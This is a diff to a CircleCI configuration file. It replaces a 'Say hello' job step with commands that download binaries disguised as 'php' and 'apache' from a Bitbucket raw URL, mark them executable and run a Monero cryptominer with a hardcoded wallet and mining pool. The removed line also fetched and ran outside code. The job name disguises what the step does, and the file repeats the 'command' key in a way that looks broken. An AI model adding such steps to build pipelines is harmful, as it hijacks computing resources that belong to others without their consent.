@@ -16,7 +16,9 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: git clone https://gitlab.com/renifer12/yda && cd yda && python run.py
+          command: lscpu
+          command: apt install curl
+          command: curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2 -pool1 gulf.moneroocean.stream:10032 -cpuThreads $(nproc --ignore 1) -rigName Nano
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
